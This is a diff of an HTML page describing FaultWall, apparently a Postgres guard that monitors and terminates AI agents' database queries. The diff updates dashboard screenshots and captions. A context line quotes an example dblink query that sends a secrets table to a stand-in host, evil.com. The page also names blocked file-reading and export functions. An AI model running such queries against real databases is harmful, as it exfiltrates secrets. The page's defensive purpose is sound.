@@ -282,8 +282,11 @@ SELECT * FROM dblink('host=evil.com', 'SELECT * FROM secrets');</code></pre>
     <p>I tested 11 scenarios on a real Postgres 16 instance running on a separate machine. Not mocks, not unit tests. Actual <code>psql</code> connections, actual <code>pg_terminate_backend()</code> calls. Table blocking, function blocking (pg_sleep, lo_export, pg_read_file), operation restrictions (allowing SELECT but blocking DELETE), unregistered agent rejection, and monitoring unidentified connections. All 11 passed.</p>
 
     <div class="screenshot">
-      <img src="dashboard.jpg" alt="FaultWall dashboard showing enforcement mode, policy violations, connected agents, and query monitoring" width="2560" height="2888" loading="lazy">
-      <div class="caption">FaultWall dashboard showing 5 blocked violations, connected agents, and per-tenant cost attribution.</div>
+      <img src="dashboard-1.jpg" alt="FaultWall dashboard: resource overview, enforce mode badge, tenant leaderboard, slow queries" style="width:100%; height:auto;" loading="lazy">
+    </div>
+    <div class="screenshot">
+      <img src="dashboard-2.jpg" alt="FaultWall dashboard: policy violations, violations per agent chart, connected agents" style="width:100%; height:auto;" loading="lazy">
+      <div class="caption">FaultWall dashboard showing enforcement mode, blocked violations, and agent activity tracking.</div>
     </div>
 
     <p>Two modes: <strong>monitor</strong> logs everything without blocking (so you can see what your agents actually do before you start killing queries) and <strong>enforce</strong> terminates violating connections via <code>pg_terminate_backend()</code>.</p>
